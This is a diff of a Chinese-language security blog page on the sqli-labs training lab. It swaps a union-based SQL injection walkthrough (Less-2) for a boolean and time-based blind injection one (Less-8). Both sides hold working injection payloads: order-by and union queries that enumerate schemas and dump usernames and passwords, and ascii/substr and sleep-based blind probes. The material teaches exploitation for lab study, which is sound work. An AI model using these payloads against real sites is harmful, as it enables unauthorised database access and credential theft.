@@ -20,38 +20,36 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"byroins.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.28.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":2,"unescape":true,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Environment: PHP 7.3.4 + MySQL 5.7.26Lab: sqli-labs Less-2  1.0 前置基础1.1 Web应用三层架构:  SQL 注入恶意输入来源于表现层, 经业务逻辑传递, 在数据访问层拼接 SQL 时触发执行   1.2 order by (探测&#x2F;排序)01 语法格式: 1order by n;  02 作用:  用于探测指定表的列数">
+    <meta name="description" content="Environment: PHP 7.3.4 + MySQL 5.7.26   Lab: sqli-labs Less-8   1.0 布尔盲注&amp;延时盲注函数在布尔注入及延时注入中, 常用函数如下:    序号 函数 注释    1 if(条件,返回值1,返回值2) 判断条件, 若为真返回(返回值1), 否则为返回值2   2 substr(str,1,2) 从第1位开始截取’str’的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Union Injection">
-<meta property="og:url" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/index.html">
+<meta property="og:title" content="Boolean and Time-blind-Injection">
+<meta property="og:url" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/index.html">
 <meta property="og:site_name" content="Byron">
-<meta property="og:description" content="Environment: PHP 7.3.4 + MySQL 5.7.26Lab: sqli-labs Less-2  1.0 前置基础1.1 Web应用三层架构:  SQL 注入恶意输入来源于表现层, 经业务逻辑传递, 在数据访问层拼接 SQL 时触发执行   1.2 order by (探测&#x2F;排序)01 语法格式: 1order by n;  02 作用:  用于探测指定表的列数">
+<meta property="og:description" content="Environment: PHP 7.3.4 + MySQL 5.7.26   Lab: sqli-labs Less-8   1.0 布尔盲注&amp;延时盲注函数在布尔注入及延时注入中, 常用函数如下:    序号 函数 注释    1 if(条件,返回值1,返回值2) 判断条件, 若为真返回(返回值1), 否则为返回值2   2 substr(str,1,2) 从第1位开始截取’str’的">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/web-application-architecture.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/information_schema.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/process.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/huixian.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/database.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/tables.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/columns.png">
-<meta property="og:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/data.png">
-<meta property="article:published_time" content="2026-07-06T14:00:00.000Z">
-<meta property="article:modified_time" content="2026-07-07T12:29:10.642Z">
+<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/1.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/2.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/3.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/4.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/5.png">
+<meta property="og:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/6.png">
+<meta property="article:published_time" content="2026-07-09T14:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-13T07:28:03.162Z">
 <meta property="article:author" content="Byron">
 <meta property="article:tag" content="information_schema">
 <meta property="article:tag" content="sql-injection">
 <meta property="article:tag" content="sqli-labs">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/web-application-architecture.png">
+<meta name="twitter:image" content="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/1.png">
 
 
-<link rel="canonical" href="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/">
+<link rel="canonical" href="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/","path":"2026/07/06/web-security/sql-injection/2026-07-06-union-injection/","title":"Union Injection"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/","path":"2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/","title":"Boolean and Time-blind-Injection"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Union Injection | Byron</title>
+<title>Boolean and Time-blind-Injection | Byron</title>
   
 
 
@@ -175,7 +173,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-0-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">1.0 前置基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-Web%E5%BA%94%E7%94%A8%E4%B8%89%E5%B1%82%E6%9E%B6%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 Web应用三层架构:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-order-by-%E6%8E%A2%E6%B5%8B-%E6%8E%92%E5%BA%8F"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 order by (探测&#x2F;排序)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-union-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 union (联合查询)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E7%B3%BB%E7%BB%9F%E5%BA%93-information-schema"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 系统库 information_schema</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-0-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">2.0 手工注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 注入流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%B3%A8%E5%85%A5%E6%A1%88%E4%BE%8B"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 注入案例</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-0-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.</span> <span class="nav-text">1.0 布尔盲注&amp;延时盲注函数</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -235,7 +233,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/private/icon1.png">
@@ -248,12 +246,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Union Injection | Byron">
+      <meta itemprop="name" content="Boolean and Time-blind-Injection | Byron">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Union Injection
+          Boolean and Time-blind-Injection
         </h1>
 
         <div class="post-meta-container">
@@ -264,14 +262,14 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-07-06 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-06T22:00:00+08:00">2026-07-06</time>
+      <time title="Created: 2026-07-09 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-09T22:00:00+08:00">2026-07-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-07-07 20:29:10" itemprop="dateModified" datetime="2026-07-07T20:29:10+08:00">2026-07-07</time>
+      <time title="Modified: 2026-07-13 15:28:03" itemprop="dateModified" datetime="2026-07-13T15:28:03+08:00">2026-07-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -304,108 +302,92 @@
     
     
     <div class="post-body" itemprop="articleBody"><blockquote>
-<p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: sqli-labs Less-2</p>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
 </blockquote>
-<h2 id="1-0-前置基础"><a href="#1-0-前置基础" class="headerlink" title="1.0 前置基础"></a>1.0 前置基础</h2><h3 id="1-1-Web应用三层架构"><a href="#1-1-Web应用三层架构" class="headerlink" title="1.1 Web应用三层架构:"></a>1.1 Web应用三层架构:</h3><p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/web-application-architecture.png"></p>
 <blockquote>
-<p>SQL 注入恶意输入来源于表现层, 经业务逻辑传递, 在数据访问层拼接 SQL 时触发执行</p>
+<p>Lab: sqli-labs Less-8</p>
 </blockquote>
 <hr>
-<h3 id="1-2-order-by-探测-排序"><a href="#1-2-order-by-探测-排序" class="headerlink" title="1.2 order by (探测&#x2F;排序)"></a>1.2 order by (探测&#x2F;排序)</h3><p><strong>01 语法格式:</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n;</span><br></pre></td></tr></table></figure>
-
-<p><strong>02 作用:</strong></p>
-<ul>
-<li>用于探测指定表的列数</li>
-</ul>
-<hr>
-<h3 id="1-3-union-联合查询"><a href="#1-3-union-联合查询" class="headerlink" title="1.3 union (联合查询)"></a>1.3 union (联合查询)</h3><p><strong>01 联合查询语法:</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1 </span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
-
-<p><strong>02 特性:</strong></p>
-<ul>
-<li>列数必须完全相等：前后两条SELECT查询的字段数量必须一致</li>
-<li>数据类型必须兼容</li>
-</ul>
-<hr>
-<h3 id="1-4-系统库-information-schema"><a href="#1-4-系统库-information-schema" class="headerlink" title="1.4 系统库 information_schema"></a>1.4 系统库 information_schema</h3><p><strong>01 概述:</strong></p>
-<p> <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace"><strong>information_schema</strong></span> 是MySQL 5.0 及以上版本自带的“元数据库”,正是该库的特性,才提供了后续注入的核心内容!</p>
-<p><strong>02 结构图解:</strong></p>
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/information_schema.png"></p>
-<p><strong>03 字段解读:</strong></p>
-<ul>
-<li>schemata: 存储所有数据库的信息<ul>
-<li>schema_name(数据库名)</li>
-</ul>
-</li>
-<li>tables<ul>
-<li>table_schema(所属数据库名)</li>
-<li>table_name(数据表名)</li>
-</ul>
-</li>
-<li>columns<ul>
-<li>table_schema(所属数据库名)</li>
-<li>table_name(所属表名)</li>
-<li>column_name(字段名)</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="2-0-手工注入"><a href="#2-0-手工注入" class="headerlink" title="2.0 手工注入"></a>2.0 手工注入</h2><h3 id="2-1-注入流程"><a href="#2-1-注入流程" class="headerlink" title="2.1 注入流程"></a>2.1 注入流程</h3><p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/process.png"></p>
-<h3 id="2-2-注入案例"><a href="#2-2-注入案例" class="headerlink" title="2.2 注入案例"></a>2.2 注入案例</h3><table>
+<h2 id="1-0-布尔盲注-延时盲注函数"><a href="#1-0-布尔盲注-延时盲注函数" class="headerlink" title="1.0 布尔盲注&amp;延时盲注函数"></a>1.0 布尔盲注&amp;延时盲注函数</h2><p><strong>在布尔注入及延时注入中, 常用函数如下:</strong></p>
+<table>
 <thead>
 <tr>
-<th>靶场</th>
-<th>关卡</th>
+<th>序号</th>
+<th>函数</th>
+<th>注释</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>sqli-labs</td>
-<td>Less-2</td>
+<td>1</td>
+<td>if(条件,返回值1,返回值2)</td>
+<td>判断条件, 若为真返回(返回值1), 否则为返回值2</td>
+</tr>
+<tr>
+<td>2</td>
+<td>substr(str,1,2)</td>
+<td>从第1位开始截取’str’的长度为2 (st)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>length(database())&#x3D;8</td>
+<td>判断数据库名称长度是否为8</td>
+</tr>
+<tr>
+<td>4</td>
+<td>ascii(s)&#x3D;115</td>
+<td>判断字母’s’编码是否为115</td>
+</tr>
+<tr>
+<td>5</td>
+<td>sleep(n)</td>
+<td>延时输出结果,n为秒数</td>
 </tr>
 </tbody></table>
-<p><strong>01 判断有无注入点</strong></p>
-<ul>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;1</span> → 页面正常返回值</p>
-</li>
-<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;2</span> → 无返回值</p>
-</li>
-</ul>
+<hr>
+<p><strong>手工注入流程(布尔盲注):</strong></p>
+<p><strong>01 判断数据库字符长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/1.png"></p>
 <blockquote>
-<p>通过以上Payload判断存在注入点,且为<strong>数字型</strong></p>
+<p>当前数据库名长度&#x3D;8</p>
 </blockquote>
-<p><strong>02 猜解列数</strong></p>
-<ul>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 1</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 2</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 3</span> → 正常</li>
-<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 4</span> → 报错 <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">Unknown column ‘4’ in ‘order clause’</span></li>
-</ul>
+<p><strong>02 猜解数据库名,(采用ascii编码)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(), 1,1))=115 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/2.png"></p>
 <blockquote>
-<p>通过以上Payload可知,当前查询涉及的表共有 <strong>3 列</strong></p>
+<p>猜测正确,第一位确实为 ‘115’, 小写字母 ‘s’, 继续猜剩余7位即可</p>
 </blockquote>
-<p><strong>03 定位回显</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<p><strong>03 猜解表名长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/huixian.png"></p>
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/3.png"></p>
 <blockquote>
-<p>通过上图得知可用回显位为2,3</p>
+<p>当前数据库第一个表, 表名长度&#x3D;6</p>
 </blockquote>
-<p><strong>04 爆数据库名</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+<p><strong>04 猜解数据表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1,1))=114 --+</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/database.png"></p>
-<p><strong>05 爆所有表</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/4.png"></p>
+<blockquote>
+<p>当前库第一个表,第一个字母并非 ‘114’ , ‘r’</p>
+</blockquote>
+<p><strong>05 猜解列名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1), 1,1))=114 --+</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/tables.png"></p>
-<p><strong>06 爆字段</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/5.png"></p>
+<blockquote>
+<p>users 表中第一个字段首字母并非 ‘114’,’r’</p>
+</blockquote>
+<p>…</p>
+<p>盲注每一步都需要猜解大量字符, 以上是标准Payload, 实际过程中使用二分法思路结合ASCII编码进行.</p>
+<p><strong>延时盲注:</strong></p>
+<p>延时盲注即在布尔盲注的语句中添加条件判断if (IF(条件, sleep(秒数), 0)) , 标准格式如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())=8,sleep(3),0)--+</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/columns.png"></p>
-<p><strong>07 爆数据</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password),<span class="keyword">null</span> <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>
-<p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/data.png"></p>
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/6.png"></p>
+<p>以上语句为真, 执行sleep(3) , 如上图, 浏览器会有加载标识</p>
 
     </div>
 
@@ -441,11 +423,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
+                <a href="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/" rel="prev" title="Character Type Union Injection">
+                  <i class="fa fa-angle-left"></i> Character Type Union Injection
+                </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/" rel="next" title="Character Type Union Injection">
-                  Character Type Union Injection <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
